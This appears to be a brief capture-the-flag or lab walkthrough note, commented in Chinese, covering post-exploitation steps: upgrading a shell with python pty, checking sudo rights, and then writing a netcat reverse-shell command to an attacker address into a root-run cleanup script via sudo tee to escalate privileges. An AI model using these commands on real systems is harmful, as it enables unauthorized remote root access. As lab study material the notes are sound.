**Pass 1**

shell #MSF切换到命令行 python -c 'import pty; pty.spawn("/bin/bash")' #切换到shell strings bill.png #查看图片隐写 sudo -l #查看当前用户可用的sudo命令 echo "nc -e /bin/bash 192.168.110.130 5555" > shell.txt  #nc反弹命令 cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh #使用tee命令将shell.txt内容输出到tidyup.sh